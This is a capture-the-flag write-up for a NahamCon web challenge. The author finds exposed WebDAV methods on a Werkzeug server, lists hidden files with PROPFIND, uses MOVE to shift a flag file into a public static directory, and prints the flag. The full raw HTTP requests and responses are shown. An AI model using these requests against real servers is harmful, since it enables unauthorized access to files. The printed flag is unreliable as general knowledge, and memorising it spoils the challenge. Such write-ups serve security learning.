
# Challenge Name: The Davinci Code


![date](https://img.shields.io/badge/date-24.05.2024-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-50-blue.svg)  

## Description

Author: @JohnHammond#6971  
  
Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken...  
  
## Detailed solution

![Pasted image 20240525235157](https://github.com/BaadMaro/CTF/assets/72421091/bdc15164-4cab-4981-b054-d33937ac2f19)

The button has the page /code which is a debug data exception with the Werkzeug traceback interpreter.
http://challenge.nahamcon.com:32230/code

Nothing interseted in the page

If we check OPTIONS we can identify some HTTP methods

```http
OPTIONS /code HTTP/1.1
Host: challenge.nahamcon.com:32230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: .AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8JFjXbWaKCBMqB4nM6SpO995LIsX6YpFlIWoUFGhuVYKW-uCS6Y3ssTeI-R0PQZp_iLlXFhuj1brxWsT17JKx2OZkBDlf5X50-fovmkk5xABQxINcv7uPEhf-jWW9bRSq-E7w48W_8i-w1IhPtllB1c
Connection: keep-alive

```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sat, 25 May 2024 22:54:56 GMT
Content-Type: text/html; charset=utf-8
Allow: PROPFIND, HEAD, OPTIONS, MOVE, GET
Content-Length: 0
Connection: close
```

We got PROPFIND and MOVE. It's used with web DAV, which mentioned in the challenge as DAVinci.

We can get files location with PROPFIND and use MOVE to place the flag in an accessible directory.

```
PROPFIND / HTTP/1.1
Host: challenge.nahamcon.com:32230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: .AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8JFjXbWaKCBMqB4nM6SpO995LIsX6YpFlIWoUFGhuVYKW-uCS6Y3ssTeI-R0PQZp_iLlXFhuj1brxWsT17JKx2OZkBDlf5X50-fovmkk5xABQxINcv7uPEhf-jWW9bRSq-E7w48W_8i-w1IhPtllB1c
Connection: keep-alive


```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sat, 25 May 2024 22:57:48 GMT
Content-Type: application/xml; charset=utf-8
Content-Length: 1108
Connection: close

<D:multistatus
	xmlns:D="DAV:">
	<D:response>
		<D:href>/</D:href>
		<D:propstat>
			<D:prop>
				<D:message>WebDAVinci Code</D:message>
				<D:directory>True</D:directory>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/__pycache__</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>__pycache__</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/templates</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>templates</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/app.py</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>app.py</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/static</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>static</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/the_secret_dav_inci_code</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>the_secret_dav_inci_code</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
</D:multistatus>
```

Secret location /the_secret_dav_inci_code

```http
PROPFIND /the_secret_dav_inci_code HTTP/1.1
Host: challenge.nahamcon.com:32230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: .AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8JFjXbWaKCBMqB4nM6SpO995LIsX6YpFlIWoUFGhuVYKW-uCS6Y3ssTeI-R0PQZp_iLlXFhuj1brxWsT17JKx2OZkBDlf5X50-fovmkk5xABQxINcv7uPEhf-jWW9bRSq-E7w48W_8i-w1IhPtllB1c
Connection: keep-alive

```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sat, 25 May 2024 22:58:52 GMT
Content-Type: application/xml; charset=utf-8
Content-Length: 453
Connection: close

<D:multistatus
	xmlns:D="DAV:">
	<D:response>
		<D:href>/the_secret_dav_inci_code</D:href>
		<D:propstat>
			<D:prop>
				<D:message>WebDAVinci Code</D:message>
				<D:directory>True</D:directory>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
	<D:response>
		<D:href>/the_secret_dav_inci_code/flag.txt</D:href>
		<D:propstat>
			<D:prop>
				<D:displayname>flag.txt</D:displayname>
			</D:prop>
			<D:status>HTTP/1.1 200 OK</D:status>
		</D:propstat>
	</D:response>
</D:multistatus>
```

The flag is located at /the_secret_dav_inci_code/flag.txt

We can move it to the static directory using MOVE method for the flag file and specify the directory using Destination header

```http
MOVE /the_secret_dav_inci_code/flag.txt HTTP/1.1
Host: challenge.nahamcon.com:32230
Destination: /static/flag.txt
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: .AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8JFjXbWaKCBMqB4nM6SpO995LIsX6YpFlIWoUFGhuVYKW-uCS6Y3ssTeI-R0PQZp_iLlXFhuj1brxWsT17JKx2OZkBDlf5X50-fovmkk5xABQxINcv7uPEhf-jWW9bRSq-E7w48W_8i-w1IhPtllB1c
Connection: keep-alive


```

```http
HTTP/1.1 204 NO CONTENT
Server: Werkzeug/3.0.3 Python/3.9.19
Date: Sat, 25 May 2024 23:00:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
```

Let's check the flag http://challenge.nahamcon.com:32230/static/flag.txt

![Pasted image 20240526000206](https://github.com/BaadMaro/CTF/assets/72421091/00324271-5e0a-40d2-9610-f288590e43cf)

## Flag

```
flag{2bc76964262b3a1bbd5bc610c6918438}
```
